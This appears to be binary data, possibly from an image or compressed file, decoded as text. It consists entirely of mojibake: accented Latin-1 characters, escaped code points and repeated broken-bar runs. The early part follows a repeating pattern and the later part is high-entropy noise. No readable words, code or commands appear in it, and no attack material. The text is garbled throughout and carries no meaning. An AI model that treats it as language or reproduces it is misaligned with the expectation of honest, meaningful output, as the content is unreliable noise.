\u00b8È\u00b8\u00b8âð¹¼Çî\u00b8\u00b8ÎÉÄ¼ÆÇé¢¦¦\u00af\u00b8\u00b8¹Äî\u00b8î\u00b8º\u00b8È\u00b8\u00b8»î\u00b8\u00b8¼Ï«¼\u00b8\u00b8\u00b8¼»Ï«º\u00b8\u00b8\u00b8¼¼îÈÑ»\u00b8ß½º\u00b8\u00b8\u00b8\u00b8¿Ú\u00b8\u00b8\u00b8\u00b8í\u00b8\u00b8\u00b8\u00b8Ãî\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºà\u00b8\u00b8\u00b8\u00b8ïÈ\u00b8\u00b8\u00b8ÂÀ\u00b8\u00b8\u00b8¹Î\u00b8\u00b8\u00b8\u00b8¿ðÆÅ\u00b8È\u00b8\u00b8\u00b8ÊÏÈº\u00b8\u00b8\u00b8¹ºÞ¹\u00b8\u00b8\u00b8ÂÞ\u00b8Ð\u00b8\u00b8\u00b8ÈÜáÈ¼\u00b8\u00b8\u00b8¼Â¹åÌ»\u00b8\u00b8\u00b8Ù¿º»Ë¿\u00b8\u00b8\u00b8åÉÚÄÂ\u00adê¾ÛÈÄ\u00b8\u00b8¹êÑÀÃ\u00afá\u00b8\u00b8ºÛ¹åÌ»\u00b8\u00b8\u00b8Ù¾ð\u00b8ñÅî\u00b8\u00b8åÈâÝ¿¬ÄÞÁ®Ä\u00b8\u00b8½âÄÂ«È¾Û\u00b8Ä\u00b8\u00b8¹êÎÀÃÈ©\u00b8\u00b8ºÛ¹åÌ»\u00b8\u00b8\u00b8Ù½ð\u00b8ÎÆî\u00b8\u00b8åÉÐÄÆ¾Ç¦¦¦\u00af¾ÛÈÄ\u00b8\u00b8¹êÛÀ¿ÀÅ\u00b8\u00b8ºÛ¹åÈ»\u00b8\u00b8\u00b8Ù¾à¹½ÆÞ\u00b8\u00b8åÉ¼¼¿©ðËÀ»ÃÐ\u00b8\u00b8¹Ñ»»Þ«¦¦¦¦¹åÌ»\u00b8\u00b8\u00b8Ù¾º¹ë\u00b8È\u00b8\u00b8åÉäÅÀ\u00b8\u00b8\u00b8\u00b8Ð\u00b8¿\u00b8\u00b8\u00b8¼¹åÌ»\u00b8\u00b8\u00b8ÙÞ\u00b8Ì\u00b8\u00b8\u00b8Èè§¹¼\u00b8\u00b8\u00b8ÐäÂÞ\u00b8\u00b8¼ñ\u00b8»\u00b8ÇÐ\u00b8\u00b8\u00b8\u00b8È\u00b8\u00b8\u00b8ÉÝÞÀ\u00b8\u00b8\u00b8ÈË¹å«¼\u00b8\u00b8\u00b8¼¼îÚéÇß¼½ÉÈê\u00b8\u00b8\u00b8\u00b8ê\u00b8\u00b8\u00b8\u00b8ÙÞ\u00b8\u00b8\u00b8½«\u00b8\u00b8\u00b8\u00b8Ê\u00b8\u00b8\u00b8\u00b8¼Þ\u00b8\u00b8\u00b8¾À\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8å\u00b8\u00b8\u00b8\u00b8\u00b8ê\u00b8\u00b8\u00b8¹¹\u00b8\u00b8\u00b8\u00b8åÞ\u00b8\u00b8\u00b8Å\u00b8Ê\u00b8\u00b8\u00b8¾Áß«Ë¹Êíº½ÞæÑ¼îÌéìîÈ½ÐÉ°ÐÎÈÑßÉÈ¼\u00b8\u00b8\u00b8\u00b8½\u00b8\u00b8\u00b8\u00b8½ßÄ½Â\u00adÌÝºÊí«¿î§Ã¼ÈÐÞËî¼\u00b8\u00b8ÁÄÞÇ§«\u00b8\u00b8½âË¹ÊìÄ\u00b8ÞÄæ¿\u00b8\u00b8\u00b8ºÞêÉ¹àºÃ\u00b8\u00b8\u00b8\u00b8âð¹Ø¬È\u00b8\u00b8ÎÉÄ½Æ¾¦¦¦¦\u00af¾½\u00a8ÞÂÀ½À½\u00b8\u00b8\u00b8ÄÀÂî\u00b8\u00b8\u00b8\u00b8ÅÀÂâº\u00b8\u00b8\u00b8À¾½êÁÎËÀÊ¼ÈÚÝÙÑÄÞÏÜâ\u00b8\u00b8½âË¹Ëß¹¦¦¦¦¼ÈÐÞ¿Þ¼\u00b8\u00b8ÁÄÞäîÚ\u00b8\u00b8½âé\u00adÈÚè¼ÈÐÞ¢î¼\u00b8\u00b8ÁÄÞîªâ\u00b8\u00b8½âË¹ËÞØ¦¦¦¦\u00b8\u00b8\u00b8ËÄ\u00b8È\u00b8\u00adÈ\u00b8\u00b8\u00b8¹¼\u00b8\u00b8¹½¢\u00b8Þ\u00b8\u00b8¹¹Ä¾Â§ÀÉ¹ÌÌÄ\u00b8\u00b8\u00b8\u00b8Û\u00b8\u00b8\u00b8\u00b8Â¼\u00b8\u00b8\u00b8\u00b8Ã\u00b8\u00b8\u00b8\u00b8ØÞ\u00b8\u00b8\u00b8ÁÀ\u00b8\u00b8\u00b8¹È\u00b8\u00b8\u00b8\u00b8Û\u00b8\u00b8\u00b8\u00b8¹À\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÆÈ\u00b8\u00b8\u00b8¿È\u00b8\u00b8\u00b8ºØ\u00b8\u00b8\u00b8\u00b8§¹Ä\u00b8\u00b8\u00b8Ðä¾¹Ä½Â®«Îºß§Ë¹Êìª¹ÈÉß¿ïÑÑ¹ä½½\u00b8È\u00b8\u00b8\u00b8\u00b8Ð\u00b8\u00b8\u00b8\u00b8ÝºÉÄ½Â\u00ad\u00b8É¹à\u00b8ß\u00b8È\u00b8\u00b8âð¹¹ÐÈ\u00b8\u00b8ÎÊíê½\u00b8êÉ¹àºÏ\u00b8È\u00b8\u00b8âð»Ý¼\u00b8\u00b8\u00b8ÎÉÄ½Æ¿å¦¦¦\u00afºá\u00b8Ì\u00b8\u00b8¹ê»á\u00b8À\u00b8\u00b8¹ëí¿È\u00b8\u00b8ºÞêÑ¼îÌ«Ï¦¦¦¦îÐÏÎ\u00b8æÞèÞ¼\u00b8\u00b8\u00b8§ÞÅÈÀ\u00b8\u00b8\u00b8îÞØÞÈ\u00b8\u00b8\u00b8ÞÁ¾½çÑÄ\u00b8ÞØ¼îÌ«Æ¦¦¦¦ï\u00afÃÂ¦ÌÛ¼îÌ«Ã¦¦¦¦îÛ\u00a8\u00b8È\u00b8\u00b8¾ðæÛ¼îÌ«ÀÇ¦¦¦î\u00b8\u00b8\u00b8¹Äî\u00b8Þ»Ê\u00b8\u00b8\u00b8\u00b8¼Þ\u00b8\u00b8¼Ï«º\u00b8\u00b8\u00b8¼¼îÉ¢¹\u00b8\u00b8\u00b8¹¹Ä½Â§§ÁÉÈî\u00b8\u00b8\u00b8¹«\u00b8\u00b8\u00b8\u00b8Çî\u00b8\u00b8\u00b8½À\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8½î\u00b8\u00b8\u00b8¼Ì\u00b8\u00b8\u00b8¹è\u00b8\u00b8\u00b8\u00b8¿È\u00b8\u00b8\u00b8¼¼\u00b8\u00b8\u00b8¹ï\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¼¼\u00b8\u00b8\u00b8»È½\u00b8\u00b8\u00b8¹àÐÉ¹º\u00b8î\u00b8È\u00b8\u00b8âð¹¬ë\u00b8\u00b8\u00b8ÎÈ§éêïÐÂ¿È§ééÈÄºÐÉ°\u00adÎÈÑßÉÈ¼\u00b8\u00b8\u00b8\u00b8Æ\u00b8\u00b8\u00b8\u00b8¼ÈÌÝÝÑÄÞ\u00b8»È\u00b8\u00b8½âÅÂ««ÙÂ¦æÌºïÞÅÂ«Ìæ¿Þ\u00b8\u00b8ºÞêÐ»Ëß«¦¦¦¦¹ßÛÐºÞÀãÎÞÁÐ¾½§ê¹ïîÅÆ¾Ë¦¦¦\u00afÝºÊí©¿È§«ÎÝ¦¦¦îÛ§»\u00b8\u00b8\u00b8\u00b8ÊæÉ¹º\u00b8ß\u00b8Þ\u00b8\u00b8âð»ÃÊÞ\u00b8\u00b8ÎÈ§«Çí¦¦¦î\u00b8\u00b8¼ñ\u00b8¿\u00b8\u00b8È¹\u00b8\u00b8\u00b8Ë\u00b8\u00b8\u00b8ÉÝÞÈ\u00b8\u00b8\u00b8ÈË¹àê¦¼ÈÍ½ºî\u00b8\u00b8\u00b8ÁÚ\u00b8\u00b8\u00b8»\u00b8\u00b8\u00b8\u00b8\u00b8ÚÈ\u00b8\u00b8\u00b8¿¼\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8íÞ\u00b8\u00b8\u00b8¿î\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8À§\u00b8\u00b8\u00b8\u00b8Ä\u00b8\u00b8\u00b8\u00b8§¹Ì\u00b8\u00b8\u00b8Ðä¿îæË¹Êí¹½ÞæÉ¹à¹é\u00b8È\u00b8\u00b8âðºëÇ\u00b8\u00b8\u00b8ÎÉÄ½Â\u00ad§¼¹Ï«º\u00b8\u00b8\u00b8¼À\u00b8¼º\u00b8\u00b8¹¢\u00b8Þ\u00b8\u00b8¹º\u00b8¹\u00b8Þ\u00b8\u00b8âª«¼\u00b8\u00b8\u00b8¼ÀÁ\u00b8\u00b8\u00b8\u00b8ºËÎººª\u00b8\u00b8\u00b8\u00b8Ï¬\u00a8ß¿ª°Ñ¹ä½½\u00b8È\u00b8\u00b8\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8Ñ¼îÌ«ÙÇ¦¦¦ï¼¾À½\u00b8¹\u00b8\u00b8ºËÀ\u00b8®¿\u00b8\u00b8¹ÑÂ¢âÏºï\u00afÁ¼îÌ«ÌÝ¦¦¦îÀ»Â¹\u00af\u00b8\u00b8\u00b8æÃ¿îâË¹Ëß\u00b8¦¦¦¦¹ßÛÐºàºÊ\u00b8î\u00b8\u00b8»¹°î»Ê»Á\u00b8È\u00b8\u00b8º¹ßÙºÍâð½É¼¾Àº«¹\u00b8\u00b8ºËÀ¾¾Ú\u00b8\u00b8¹Ñ¼îÌ«¼í¦¦¦ïæé°ÞÚè¾ßÄ½Æ\u00b8Ï¦¦¦\u00afËÄ\u00b8È\u00b8»È¼\u00b8\u00b8¹À\u00b8\u00b8¹½¢\u00b8Þ\u00b8\u00b8¹¹Ä¼ÝÞÈ\u00b8\u00b8\u00b8ÈË¹Êë\u00b8ºÌÌÄ\u00b8\u00b8\u00b8\u00b8ÛÞ\u00b8\u00b8\u00b8¹§\u00b8\u00b8\u00b8ºï\u00b8\u00b8\u00b8\u00b8ÉÈ\u00b8\u00b8\u00b8¿Ð\u00b8\u00b8\u00b8¹½\u00b8\u00b8\u00b8\u00b8êî\u00b8\u00b8\u00b8¹§\u00b8\u00b8\u00b8\u00b8Â\u00b8\u00b8\u00b8\u00b8ËÞ\u00b8\u00b8\u00b8Á§\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8§¹Ð\u00b8\u00b8\u00b8Ðä¿Þ§éî¹ÐÂ¼ÈÈÞ§È¼\u00b8\u00b8ÁÄÞÑÅÀ\u00b8\u00b8½âÅÂ\u00ad§Æ¹È«¼ÐÉ\u00afäÎÈÑßÉÈ¼\u00b8\u00b8\u00b8\u00b8É\u00b8\u00b8\u00b8\u00b8¼ÈÈÞÆîÀ\u00b8\u00b8ÁÄÞéê«\u00b8\u00b8½âÅÂ«âÝºÊí¬½\u00b8êÎ»Ëß\u00af¦¦¦¦\u00b8æî½\u00b8\u00b8\u00b8Ù\u00b8«îº\u00b8\u00b8\u00b8Ù¹\u00b8Ìæºî\u00b8\u00b8ºÞêÉ¹Ê¹Ä\u00b8È\u00b8\u00b8âð¹ÅÑÞ\u00b8\u00b8ÎÈ§«ÍÇ¦¦¦îÐÏÎ\u00b8æÆ¹ÊÍØ»ÞÍÐ¾½§êº¹\u00afÂ»ËÞ°¦¦¦¦¼ÈÈÞÍî¼\u00b8\u00b8ÁÄÞ¾½Ú\u00b8\u00b8½âé\u00adß¼¼ÀÄ§\u00b8\u00b8\u00b8ºËÀÇß§\u00b8\u00b8¹Ñ»ËÞÑ¦¦¦¦¹ðæÉ¹Êºá\u00b8È\u00b8\u00b8âðºëá\u00b8\u00b8\u00b8ÎÈ§«\u00b8¦¦¦¦î\u00b8\u00b8\u00b8¹Äî¹\u00b8»§\u00b8\u00b8\u00b8\u00b8¹Þ\u00b8\u00b8¼Ï«¼\u00b8\u00b8\u00b8¼¼îÍ¢\u00b8Þ\u00b8\u00b8¹¹Ä¾Â§ÀÉ¹¼ÌÄ\u00b8\u00b8\u00b8\u00b8Ú\u00b8\u00b8\u00b8\u00b8ÂÄ\u00b8\u00b8\u00b8\u00b8Ã\u00b8\u00b8\u00b8\u00b8¿\u00b8\u00b8\u00b8\u00b8ÂÌ\u00b8\u00b8\u00b8ºË\u00b8\u00b8\u00b8\u00b8æî\u00b8\u00b8\u00b8¼¼\u00b8\u00b8\u00b8\u00b8Ú\u00b8\u00b8\u00b8\u00b8ÎÈ\u00b8\u00b8\u00b8¿â\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8§¹Ú\u00b8\u00b8\u00b8Ðä¾¹Ä¼Â®«Îºß¼½¿ª©ËÀÇ«ñ\u00b8\u00b8¹Ñ¼îÈééÈ«¼»ÞÍß¿ðïÑ¹ä½½\u00b8È\u00b8\u00b8\u00b8\u00b8Ì\u00b8\u00b8\u00b8\u00b8Û¼îÈéãÉ¼½¿ðÆËÀ¿\u00a8°\u00b8\u00b8¹ÑÂ¢\u00afÆ¹\u00b8êÉ¹Ê¹¿\u00b8È\u00b8\u00b8âð\u00b8ÇÐÞ\u00b8\u00b8ÎÉÄ¼Æ¿»¦¦¦\u00afºá\u00b8À\u00b8\u00b8¹ê»¹\u00b8ÍíÀ\u00b8\u00b8\u00b8ºÞêÎ¼îÈ«ÎÝ¦¦¦îÐÏÎ\u00b8æÆ¹ÊÍØ»\u00b8«½º½ÞÄ¼ÈÐÞ\u00af\u00b8\u00b8\u00b8\u00b8ÁÄÞåãÞ\u00b8\u00b8½âË¹»Þ©¦¦¦¦º¹ßÛÃÈÞÏ¼îÈ«ÂÝ¦¦¦ïâé°ÞÚè¾ÉÄ¼Æ¹ñ¦¦¦\u00afËÄ\u00b8Ä\u00b8®Þ\u00b8\u00b8\u00b8\u00b8æ\u00b8\u00b8¹½¢\u00b8Þ\u00b8\u00b8¹¹Ä¾ÝÞÈ\u00b8\u00b8\u00b8ÈË¹ðë»¼ÈÍ½»\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ºË\u00b8\u00b8\u00b8\u00b8¼î\u00b8\u00b8\u00b8ÀÄ\u00b8\u00b8\u00b8¹Ñ\u00b8\u00b8\u00b8\u00b8Ùî\u00b8\u00b8\u00b8½â\u00b8\u00b8\u00b8ºÍ\u00b8\u00b8\u00b8\u00b8Éî\u00b8\u00b8\u00b8½â\u00b8\u00b8\u00b8\u00b8Ä\u00b8\u00b8\u00b8\u00b8ÎÈ\u00b8\u00b8\u00b8Å\u00b8Ð\u00b8\u00b8\u00b8¾Áß\u00afÂ¼îÌéíÉÐÂ¾¹Ä½Â®ÐÆ¹\u00b8Íß¿©½Ñ¹ä½½\u00b8È\u00b8\u00b8\u00b8¹À\u00b8\u00b8\u00b8\u00b8É¹à\u00b8Ý\u00b8È\u00b8\u00b8âð\u00b8\u00ad\u00a8È\u00b8\u00b8ÎÉÄ½Â¬ÀÉ¹ðº¹\u00b8\u00b8\u00b8\u00b8âð¹ÚÝî\u00b8\u00b8ÎÊíê¼ÞÃ¢½È«\u00b8\u00b8\u00b8¼ÀºïêË¹Ëßî¦¦¦¦\u00b8æîº\u00b8\u00b8\u00b8Ù\u00b8îÉíÀÈ\u00b8\u00b8ºÞêÙ¼îÌ«Îí¦¦¦îÐÏÎ\u00b8æ½ÁÍæÅ¹ÈãÐ»ÉâË¹Ëß¾¦¦¦¦ºÉßÛÃÈÞÏ¼îÌ«ÆÝ¦¦¦ïÞé°ÞÚè¼ÈÐÝ¼¬ÄÞØÂÀ\u00b8\u00b8½âË¹ËÞà¦¦¦¦\u00b8\u00b8\u00b8ËÄ\u00b8Ä\u00b8\u00b8î¼\u00b8\u00b8¹\u00b8\u00b8\u00b8¹½¢¹\u00b8\u00b8\u00b8¹¹Ä¾ÝÞÀ\u00b8\u00b8\u00b8ÈË¹ðëÃ¼ÈÍ½ºî\u00b8\u00b8\u00b8Âî\u00b8\u00b8\u00b8ºì\u00b8\u00b8\u00b8\u00b8é\u00b8\u00b8\u00b8\u00b8½§\u00b8\u00b8\u00b8\u00b8Ð\u00b8\u00b8\u00b8\u00b8ÉÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹®\u00b8\u00b8\u00b8\u00b8à\u00b8\u00b8\u00b8\u00b8ºî\u00b8\u00b8\u00b8\u00b8ê\u00b8\u00b8\u00b8\u00b8§¹â\u00b8\u00b8\u00b8Ðä¼ÈÐÞÐÈ¼\u00b8\u00b8ÁÄÞßëæ\u00b8\u00b8½âË¹Êì\u00a8½ÞæÉ¹ð\u00b8í\u00b8Þ\u00b8\u00b8âð»àÊî\u00b8\u00b8ÎÉÄ½Â\u00ad¼¼\u00b8©¼ÝÎãâ¾ÐÌÌ¹\u00b8\u00b8\u00b8\u00b8¹È\u00b8\u00b8\u00b8¹êË¹ÊìÃ¾Êí¬¿î§Ã¼ÈÐÞ§î\u00b8\u00b8\u00b8ÁÄÞäÏÀ\u00b8\u00b8½âË¹Ëßî¦¦¦¦\u00b8æîº\u00b8\u00b8\u00b8ÙÙðÀ\u00b8\u00b8\u00b8æÃ¼ÈÐÝÙ¬ÄÞãÑÄ\u00b8\u00b8½âË¹ËßÊ¦¦¦¦¹ßÛÐºà¹åº\u00b8\u00b8\u00b8»¹\u00afÁ»Ê»Å\u00b8Þ\u00b8\u00b8º¹ãÙºÍâðº¹ÐË¹ËÞï¦¦¦¦¼ÈÐÞ»È¼\u00b8\u00b8ÁÄÞ°\u00af\u00b8\u00b8\u00b8½âé\u00adÈÚè¼ÈÐÝÜÑÄÞÅÛÞ\u00b8\u00b8½âË¹ËÞÅ¦¦¦¦\u00b8¹Äî\u00b8î»¢\u00b8\u00b8\u00b8\u00b8½\u00b8\u00b8\u00b8¼Ï«º\u00b8\u00b8\u00b8¼¼îÑ¢¹\u00b8\u00b8\u00b8¹¹Ä¿Âñ\u00afÉ¹ÌÌÃ\u00b8\u00b8\u00b8\u00b8ÞÈ\u00b8\u00b8\u00b8¼È\u00b8\u00b8\u00b8¹º\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¿§\u00b8\u00b8\u00b8¹Î\u00b8\u00b8\u00b8\u00b8èÈ\u00b8\u00b8\u00b8½Ð\u00b8\u00b8\u00b8\u00b8Ë\u00b8\u00b8\u00b8\u00b8»\u00b8\u00b8\u00b8\u00b8ÂÀ\u00b8\u00b8\u00b8»È¾Þ\u00b8\u00b8¹àÐÝºÉÄ½Â\u00af¼Îºß«Ë¹Êì\u00ad¹ÈÉß¾\u00a8â¾ÐÌÌ¹\u00b8\u00b8\u00b8\u00b8»î\u00b8\u00b8\u00b8¹¼¾¿§ðËÀ¾åÃ\u00b8\u00b8¹Ñ¼îÌéäï¼¾À¿«¹\u00b8\u00b8ºËÀºÁá\u00b8\u00b8¹ÑÂ¢îÌºï¼¾¿ñÊËÀ½¼æ\u00b8\u00b8¹Ñ¼îÌ«Û¦¦¦¦îÂÄ¹È\u00b8\u00b8¾îÆÄ\u00b8Þ\u00b8\u00b8¾ðÞá\u00b8\u00b8\u00b8Âºï¼¿À¹¼¹\u00b8\u00b8ºËÀÃÞÑ\u00b8\u00b8¹Ñ¼îÌ«ÌÇ¦¦¦îÐÏÎ\u00b8æÞº\u00b8È\u00b8\u00b8\u00b8îÝ»Þ§Þ\u00b8Þ¼\u00b8\u00b8\u00b8ÞØÎîãÑÄÞâÝºßÄ½Æº®¦¦¦\u00afÜÂ¦Ð¿ÛÊ\u00b8\u00b8\u00b8\u00b8¼è¼ÈÚÝÍÑÄÞãßÌ\u00b8\u00b8½âË¹ËÞÊ¦¦¦¦\u00b8\u00b8»¦èëïíÊáîääÂÄæÅÊî¢åçëªíÁ¾Ñ¦«Û\u00af¿®í®¢ë§ØÁÃ\u00a8Å¹ÅëÝèÍÀíÜ©èàÝ¹ðæ°íâÅÀè¦ÛÇìªÈÛÉëí§¼àÙÅ«Ú\u00b8¬í¼ÛñÇ°äÈäª¼§ßª®Ì\u00a8ÈäïÌ\u00a8áÀÙ¾ÚÆ¦Ú\u00afÂ®Ì\u00b8\u00a8í¦¢Ï»ÛÏÌìÊ¬Ä\u00a8ÃÇê¾ª°Ñ½Ìæ\u00afÅªØÅãØ§«ä¼åáÌãÑëÍÝ\u00b8¼Ä®ÅÌÛð¼ºçÞÑãã¬Éì¬Ê«ÙãÑÊå\u00a8¾îßáåá¹ÄïÑìÈÌ¦ÁÎíÃÈî\u00a8Âé°ªßëåâßÅ®ÎÚ°Äì¿¾ÈÆ¹äíÏÚÀÐêÃ½ï»ìì°Ç¾ºê§Ç°èÄÈ«Ú®è¾éÞÞ¾¢Û\u00b8æØìßæÑ®âáÎÎÌ\u00b8É\u00afçÅ¹ãÞß\u00af«©©ÁêÉ\u00adÜàÝÍÅíÛØåÝ¢ªÑªÑ¾Ë½Ú¼ÇñîãÁá\u00adØ¿ÎÑºÂ\u00a8ÏÉäÇáÝÆã®ÙÅÀÆÂÌåÎÅãÌÂê\u00adæäÁÞæÆÄâ\u00b8Ë©ñðçËîáñé½ñã\u00adÊ\u00b8ËÁ\u00adÉÁ®¦âêÁ§¬å°ìàÝÍÉ¼Ð¹»ÝÀåÐ§Âìà¢¿ËâÌ«ÅÞàÏ\u00afÐï¿\u00b8Ù¾¼ÅØª¿É\u00a8½ÜßÎºßÉÞÚ\u00a8Çåâì§Ú\u00afªÅ¢æºÐË»ÁÂ¾ßáæ\u00b8ìéÛ¢Û¹§Ì\u00afÐêðæÝ½Ïð½\u00b8ÅêÎîÇÐâ¼ÞðÑïí¦¬Üç®Ïî°Ï\u00afÅªíçê¾½ÅÍ©¬ªéß©ßñ®ÆßÈèàç\u00afíÙæ\u00a8»Þã¾ÎÚÜÁïÎá¹í°§À\u00adÚØÁÅíÎÏÝÑâì¿«¢ÐÊáéÅÇ«§§Ùº½ÎáãñÍ\u00b8ß¢¹ñí»©ãÐÅ¢áé¦ÙÉäîñåíÉ¢Üíî®ÈàæÄèºÅç©®\u00b8ÄñÑ\u00b8È\u00a8¦åÚíàÑ«Ð¼Ã»ÊÊáÎÅ¬ÎîÞ¹âª¬Û¦¦ÂçÆÆÎ¼àÙ§ÃÚÙ¹ë\u00a8ÜÊ®ìåðééìðÏ¬«ÉÐÝÃ¹¢«¢¦ÀªÞèÄçìðâ©§à«èÍëÐÈ»ª«ë\u00afèéïåâ\u00a8ÛìÆë«ì¾Û¾¬ÅèìÏ¾îÏÍèÞØæª°îÙä¾Í¾Ø¢ÁèÉÆ¹®ËÂ¬ÚÑ«¿ÈëÍ«¼¼ÑßÊÄß¾©Û¦ãáëÆÁÞ¿äÛëº»í§ËèÁî¾®êÃº¹¿ëá»È°¿©§Ãíñ\u00b8ïèÜ®Ì»ïÛìÜÂÃÙÞÊ¿å§ÜÅá\u00adÁæ°Â\u00b8É½ÃÏâ¢ª»âÅîåÄèÃËßÑÁ¹ÍßÉÙÝºçÄæãÃïáÐÉ¾æÊðÜ¼ÙÑ¿á¼ÀÅ¹ÈÌ¬áÝéÜ§ãÚð°ÅíÜè°âíïä¹çÏÐ°ÏØî®\u00af¬ä½á¦ÄººÄ©ÐìÜØîåÎðØÊÀÑÉ¢¼ØäÍÉæ¿ëíÑëÌâØÑÚð\u00adãÝíÂéÍëìÞÚ\u00b8Ú\u00adÊÆï¼ëÅÍ\u00b8É©¬\u00a8ï¢\u00adºÝ½Ü»ã\u00b8íÛæÇäææ\u00b8ìªå¹ÍèÍðÆàãáä°Ü¾ßÈáÞ¿Â\u00adà®½äéÐ®ªÎ\u00ad¹¿ÜÇ¼Ìë°¬áÅÏªÞÂ°\u00b8ÁìÑÆäæñÛçÈ¾èíË»Ã»Ú¾ïÙïÃß¢»«ß¹ÈØ§ØæÉ¿ËÇ©â¦ã\u00b8Â«ÇÄÃ¼ìÙÚ°ÆÞ¾Üãè«©ÚÎÍð¾ÊÜÅÝáåÑé\u00afÑÜé½\u00a8»ïáíÚÏîËËÁ\u00a8\u00ad¼§æÍÙëåª\u00b8®¢ç«ëÛ«Ñ¦îÑÍÎ\u00adÍî\u00adåÍÂ¹¼îÄÜÊÈÐÆîÇÞ\u00adãïª¿¬ç®ïèÃïñäÚà«Îîë§ÝÄéÇïªÁ¢Æå¼æÝâÐÏñÑ½Ë¾Ëàè¼Û°é§çæ¬¢ÇÛÞÇÛÀ\u00a8¼Þ¿\u00a8ÊÄ©¢§â®ºÄ¾¾\u00afºÈÌ©«¼¹½Ù\u00a8§îå©¢\u00b8ÄàèåÎºÐÐÜ½Ì°©Ïï½ÊªâßçäêðÂè\u00af°½ÍÑ»Ëá\u00afØð¢Ü»¾ÛÚ\u00b8ÁÃÁ©Ø°ËÀ\u00b8ÅçÑÊ¬¿ËåÝëÝ®éË¾ÜÝÌèèÙÛñïÑáåÄáåÃ¼¦ÝÜ\u00a8çØÙÑ\u00adé\u00b8¼çÂÐàÊª¬¿ÇÊêÝá©ÏÑÞÇåÌÙÞñÛåì¼»\u00adÛãÜááíÃËÎ\u00afáÚ«ºàÎàÜãÊÙääÅÂ\u00adÂÙàÁæ¿ÑÝßïèßîØªÞ§âé«ÛÏÀ¹ÏäÉ©è¿°áÆ\u00afÄ¾ÉÎÜØß¿\u00a8Å«¹èºä\u00afÃâáÜïÃÈðïªÆÌÁèËÄÌìÝ«ÆÏÐðìáØêÜÂá§¹¹ÚÃÇÆ©\u00b8Ïå©È®çëçäÍ©Èè°áéØËìÆªÙÉáÀÐ½îïåÂ\u00b8À¢ÛÜÝæñà¼ÁÌÙÆæËÉñ«Ðî¼Ã¬ä®ãàï½åÄíÌ¬ÍÏÁºÂâãì¿\u00a8ÌÃèÏÙÇÀñÌ«ðçÉáíÉ\u00a8éÍ®¿Ä«®Þ¾»êÌÄ»¼¦Í¦ä¦®¢Í«àÅÞÄâî¦\u00b8Áäè\u00adÍºÑâÑ¼ìÁ¹Á¼ÞÄÆÏ«¼Ë¿ÞêÎéêéëÅÀÊ¢ñÄä\u00a8ÅÞÍéÆ¹À¹Ä«Û¼ì®\u00a8»¹Å¿¦¾¼çÉÎðÙæâíàË¦ðîÜÉ¿äÃØã\u00af\u00afËãÙºéØ©Þ½ÅÃïÎï¿ì®îìê¬ðë\u00a8®»ÁÑæÑ°¬¾«¼\u00af½\u00b8íÎäÛ\u00adÎÄÇÐÎäÛãæîÌ¬ïª\u00afÁÉâÚ¢\u00adºÇÆÑ©íÑ¿ØÝ¦\u00a8ØêÍåÄ¿\u00b8Ù¹«ÜñØ°çÞÚ¢ç¾ãï¬«ÅæÆØê®îÀïãÉÄÏ\u00b8®ÇÊèäáÄâÏ\u00afðÉÍ¾©ï¿¬¾ÝªÅ°ÞÛèæºÂç¼Äæìã»¼ÙªàÏÃª\u00a8Û\u00b8¾\u00adÜ½ÊªÛ\u00afÁÚ¬®îá\u00adØ½\u00afÍí¬ëìÞÀÌ¦º¦°ª\u00adÄåíä¿É¦\u00ad¢ÜÎ»\u00af«À¾¬ßÙÎéÑ§É«È¹Æ®ÝïÈï¬â\u00adØÃºåÁÄçÙ»¦¿ÝÜÎè«¢¾îÏÃ½èÐ½¼Æ\u00adåÄ¦©\u00b8¹ÆÀØîáØÞ¼§ß¢ØØ¬ÞÝÑÑª°Æ»à«ÉºîìªÎ¬ÂèÞéëÊ«»íÍïìà«\u00adÑñØÛÜìëÜÛÈ½ÑËÝÂð¢ëÊÎ\u00adÚ¹æÁÈå¿ÄÜÄ¾ÀÈ«Àå¼¹Û½ÌªñÃé«\u00adñÙîë¼º¢åÎÍÌê¹áÙåßÙÙÛÃ¾Èà¿ÀÈé¹ñ®ÂÍÚ»çÛìÍðÃ½©ë»ÅñàÁÁÜÃ¼à\u00afÛ½àÜ½Æ¼êÇ¬ã¾Úé½ÂìÄ¿\u00a8èÅáæäÙËåÇ¿Æ\u00a8\u00b8½á§\u00b8¢ÌÉèÇãÃÅæÙ½§ë¿ØíÊéîßËã»ÜÌÂìàÞÑ©ÇºÉ\u00a8\u00ad¦ÍÇ§Ú½ëÇÐªéîëàÞÚáïªªã¾ÜÏ¬½Üñ\u00b8§\u00afÑ«¦äÌ¢ÏÂ©ÂÝìíºßíèÌÌç¦È\u00adÞ°æÈÞëðç°éØ©\u00a8í«Åì¿Úéì¿ãìÙåå©§âÛ\u00b8\u00a8áÛÇÄð\u00adÏÏ½åçÚÁíï«äßÆÆ¾ª§ãâªÅÀÑì\u00a8çÜÀßéÈÇÉæÉÊÎëâ½Ê\u00af¾Ë®ßî¼î¦½ÛÇ§ÚÊ\u00afØã¢¢ÇªñÌºÍË½ÍÚÐà¢°Þ¿¹¼\u00adæ¬ÇÈÏØí¹äÀÇ¦Ç¹ÃÑÂÍÃÇÐÆÄÁíÞâÏëá¼ÅßÇÇÉÄ\u00a8Á¼ç¢áîÏÐçÌ¾Å¹ë¢¼ÇÛÇÉÞ¦Ñª¦ëÛÑÛéë¦àÚï¾ïåÍ½«Ëàç°¾ØÚÚÀÛÊÈñ\u00b8®ÞÑ¾¼©ì\u00b8½ÄÜëàîàÏëÉ°ÂÆêÍ©»ÎÁ½ÞÍ\u00afçÑ©\u00a8è\u00ad\u00ad«Ç½ÂªªÄÉ